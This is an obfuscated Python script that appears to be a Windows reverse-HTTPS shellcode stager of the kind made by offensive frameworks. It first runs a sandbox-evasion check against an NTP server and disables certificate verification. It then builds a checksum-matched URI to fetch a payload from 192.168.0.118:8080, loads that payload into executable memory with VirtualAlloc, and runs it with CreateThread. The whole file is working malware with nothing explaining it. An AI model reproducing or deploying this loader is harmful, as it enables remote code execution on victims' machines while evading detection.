import urllib.request, string, random, struct, time, ssl, ctypes as CSwhVMDNyanSz
import multiprocessing
ogFtbdYdab = multiprocessing.cpu_count()
if ogFtbdYdab >= 1:
	from time import sleep
	from socket import AF_INET, SOCK_DGRAM
	import sys
	import datetime
	import time
	import socket
	import struct
	client = socket.socket(AF_INET, SOCK_DGRAM)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	FJyAVMk = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
	sleep(5)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - FJyAVMk).seconds >= 5):
		ssl._create_default_https_context = ssl._create_unverified_context
		def lAlKOzoCi(s): return sum([ord(ch) for ch in s]) % 0x100
		def foMSDgU():
			for x in range(64):
				pgwNTrlxD = ''.join(random.sample(string.ascii_letters + string.digits,3))
				skEHCIkog = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
				for BnTfpLKFGrM in skEHCIkog:
					if lAlKOzoCi(pgwNTrlxD + BnTfpLKFGrM) == 92: return pgwNTrlxD + BnTfpLKFGrM
		def GpKNzPQYrhifd(uTZjnIxEJW,uoLfAtutFB):
			AqMkeuuj = urllib.request.ProxyHandler({})
			kBLDDWrW = urllib.request.build_opener(AqMkeuuj)
			urllib.request.install_opener(kBLDDWrW)
			BzgfCERv = urllib.request.Request("https://" + uTZjnIxEJW + ":" + str(uoLfAtutFB) + "/" + foMSDgU(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
			try:
				RxYKEvGSVdNKM = urllib.request.urlopen(BzgfCERv)
				try:
					if int(RxYKEvGSVdNKM.info()["Content-Length"]) > 100000: return RxYKEvGSVdNKM.read()
					else: return ''
				except: return RxYKEvGSVdNKM.read()
			except urllib.request.URLError: return ''
		def sVFeHXUn(mfcUovqvCIgi):
			if mfcUovqvCIgi != "":
				AfkTOLoyyMCwha = bytearray(mfcUovqvCIgi)
				OjyCgbOLriLYI = CSwhVMDNyanSz.windll.kernel32.VirtualAlloc(CSwhVMDNyanSz.c_int(0),CSwhVMDNyanSz.c_int(len(AfkTOLoyyMCwha)), CSwhVMDNyanSz.c_int(0x3000),CSwhVMDNyanSz.c_int(0x40))
				pObhNJmazSS = (CSwhVMDNyanSz.c_char * len(AfkTOLoyyMCwha)).from_buffer(AfkTOLoyyMCwha)
				CSwhVMDNyanSz.windll.kernel32.RtlMoveMemory(CSwhVMDNyanSz.c_int(OjyCgbOLriLYI),pObhNJmazSS, CSwhVMDNyanSz.c_int(len(AfkTOLoyyMCwha)))
				mkrVXvcl = CSwhVMDNyanSz.windll.kernel32.CreateThread(CSwhVMDNyanSz.c_int(0),CSwhVMDNyanSz.c_int(0),CSwhVMDNyanSz.c_int(OjyCgbOLriLYI),CSwhVMDNyanSz.c_int(0),CSwhVMDNyanSz.c_int(0),CSwhVMDNyanSz.pointer(CSwhVMDNyanSz.c_int(0)))
				CSwhVMDNyanSz.windll.kernel32.WaitForSingleObject(CSwhVMDNyanSz.c_int(mkrVXvcl),CSwhVMDNyanSz.c_int(-1))
		xmCjGeQh = ''
		xmCjGeQh = GpKNzPQYrhifd("192.168.0.118", 8080)
		sVFeHXUn(xmCjGeQh)
